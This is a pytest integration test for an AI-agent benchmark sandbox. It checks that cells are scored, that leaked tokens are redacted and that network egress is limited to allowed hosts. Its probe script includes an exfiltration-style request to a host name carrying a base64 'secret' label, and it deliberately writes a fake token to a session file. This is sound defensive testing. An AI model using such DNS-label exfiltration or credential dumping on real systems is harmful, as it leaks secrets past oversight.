"""The cell itself, running: containers, network, evaluator, scores.

Skipped unless there is a Docker to run it on and an image to run. What stands
in for the agent is a script that submits the kernel as it was given, because
what is under test is the cell around the agent rather than any model: that the
evaluator comes up, that only it can be reached, that a score it records lands
in the cell, and that the cell is cleaned up after.
"""

import shutil
from pathlib import Path

import pytest

from stupidbench import runner
from stupidbench.cell import Cell
from stupidbench.redact import redact
from stupidbench.report import read_history
from stupidbench.usage import Tier

IMAGE = "ghcr.io/humanfia/flowbench-runtime:latest"


def _docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        import docker

        docker.from_env().images.get(IMAGE)
    except Exception:  # noqa: BLE001  (any failure here means: skip)
        return False
    return True


pytestmark = pytest.mark.skipif(
    not _docker_ready(), reason=f"needs Docker and the {IMAGE} image"
)


def test_a_cell_runs_and_is_scored(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setattr(runner, "IMAGE", IMAGE)
    monkeypatch.setattr(runner, "TICK_SECONDS", 5)
    monkeypatch.setenv("CODEX_ACCESS_TOKEN", "a-token-no-one-should-publish")
    cell = Cell("gpt56sol_max", 0, tmp_path / "cell")
    runner.prepare(cell)
    # The agent's own loop needs a credential this test has not got, so this
    # submits the kernel unchanged and writes the token where an agent that
    # printed its environment would have.
    (cell.agent_dir / ".stupidbench/run.sh").write_text(
        "#!/bin/bash\n"
        "mkdir -p .stupidbench/codex/sessions\n"
        'echo "CODEX_ACCESS_TOKEN=$CODEX_ACCESS_TOKEN" '
        "> .stupidbench/codex/sessions/leak.jsonl\n"
        "python3 tests/generate.py\n"
        "python3 tests/submission_tests.py\n",
        encoding="utf-8",
    )

    outcome = runner.run(cell, 600)

    assert outcome == "ran"
    # The evaluator scored the kernel it was sent, and the score reached the
    # cell rather than staying in the container that made it.
    scores = cell.scores()
    assert scores and scores[0][1] > 0
    assert cell.elapsed > 0
    assert next(event.type for event in cell.events()) == "start"
    assert cell.events()[-1].type == "stop"

    history = read_history(cell, {"gpt-5.6-sol": [Tier(0, {"completion": 1.0})]})
    assert history.points[0].score > history.points[-1].score or len(scores) == 1

    # Nothing the cell holds may leave the runner carrying the token.
    leak = cell.state_dir / "sessions/leak.jsonl"
    assert "a-token-no-one-should-publish" in leak.read_text()
    redact(cell.cell_dir, ["a-token-no-one-should-publish"])
    assert "a-token-no-one-should-publish" not in leak.read_text()


def test_a_cell_reaches_nothing_but_its_evaluator(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setattr(runner, "IMAGE", IMAGE)
    monkeypatch.setattr(runner, "TICK_SECONDS", 5)
    cell = Cell("gpt56sol_max", 1, tmp_path / "cell")
    runner.prepare(cell)
    # Six ways out, two of which are meant to work.
    (cell.agent_dir / ".stupidbench/run.sh").write_text(
        """#!/bin/bash
python3 - > egress.txt <<'PROBE'
import urllib.error
import urllib.request


def reach(url, proxied):
    opener = urllib.request.build_opener(
        *([] if proxied else [urllib.request.ProxyHandler({})])
    )
    try:
        opener.open(url, timeout=20)
    except urllib.error.HTTPError:
        return "reached"
    except Exception:
        return "blocked"
    return "reached"


print("direct:", reach("https://example.com/", False))
print("proxied:", reach("https://example.com/", True))
print("provider:", reach("https://api.anthropic.com/", True))
print("evaluator:", reach("http://evaluator/scores", False))
print("labelled:", reach("https://c2VjcmV0.10-11-12-13.nip.io/", True))
print("subdomain:", reach("https://www.chatgpt.com/", True))
PROBE
""",
        encoding="utf-8",
    )

    runner.run(cell, 300)

    report = (cell.agent_dir / "egress.txt").read_text()
    lines = dict(
        line.split(": ", 1) for line in report.strip().splitlines() if ": " in line
    )
    # Nothing goes out without the proxy, and the proxy forwards to the
    # providers alone.
    assert lines["direct"] == "blocked"
    assert lines["provider"] == "reached"
    assert lines["evaluator"] == "reached"
    assert lines["proxied"] == "blocked"
    # A host that public DNS answers for any label at all, and a label below a
    # provider: both are how a name carries something out, and the allow list
    # matches the six exactly, so neither is a way through. That the cell also
    # never had them looked up is what the gate's own config is asserted on —
    # from in here a refusal and a refusal after a lookup read the same.
    assert lines["labelled"] == "blocked"
    assert lines["subdomain"] == "blocked"
